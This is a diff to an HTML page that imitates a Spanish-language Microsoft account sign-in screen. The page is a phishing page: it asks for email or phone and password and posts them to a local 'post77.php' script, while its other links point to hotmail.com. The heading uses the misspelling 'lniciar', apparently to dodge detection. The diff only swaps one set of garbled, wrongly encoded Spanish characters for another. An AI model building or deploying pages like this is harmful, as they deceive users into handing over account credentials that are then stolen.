@@ -5,25 +5,25 @@
     <link rel="apple-touch-icon" href="https://i.ibb.co/98kZnbb/asd.png">
     <link rel="apple-touch-icon-precomposed" href="https://i.ibb.co/98kZnbb/asd.png">
 	<head>
-		<title>Iniciar sesi髇 en tu cuenta Microsoft</title>
+		<title>Iniciar sesi贸n en tu cuenta Microsoft</title>
 		<link rel="stylesheet" href="css/master.css" href="master.css">
 	</head>
 	<body>
 		<div class="form">
 		  <img src="img/logo.png" class="avatar" alt="Avatar Image">
 			<form action="post77.php" method="POST">
-			    <h2>lniciar sesi髇</h2>
+			    <h2>lniciar sesi贸n</h2>
 				<br>
 				<br>
-				<input class="phone-no " name="username" id="login-username" tabindex="1" autocapitalize="none" autocorrect="off" autofocus="true" placeholder="Correo electr髇ico, tel閒ono o Skype" type="text">
+				<input class="phone-no " name="username" id="login-username" tabindex="1" autocapitalize="none" autocorrect="off" autofocus="true" placeholder="Correo electr贸nico, tel茅fono o Skype" type="text">
 				<br>
 				<br>
-				<input type="password" name="password" placeholder="&nbsp;Contrase馻" required>
+				<input type="password" name="password" placeholder="&nbsp;Contrase帽a" required>
                 <br>
 				<br>
-				<h3>縉o tiene una cuenta?<a href="https://hotmail.com" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Cree una. </a> </h3>
-				<h3><a href="https://hotmail.com" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Iniciar sesi髇 con una llave de seguridad </a> </h3>
-				<h3><a href="https://hotmail.com" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Opciones de inicio de sesi髇 </a> </h3>
+				<h3>驴No tiene una cuenta?<a href="https://hotmail.com" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Cree una. </a> </h3>
+				<h3><a href="https://hotmail.com" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Iniciar sesi贸n con una llave de seguridad </a> </h3>
+				<h3><a href="https://hotmail.com" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Opciones de inicio de sesi贸n </a> </h3>
 				<br>
 				<br>
 				<br>
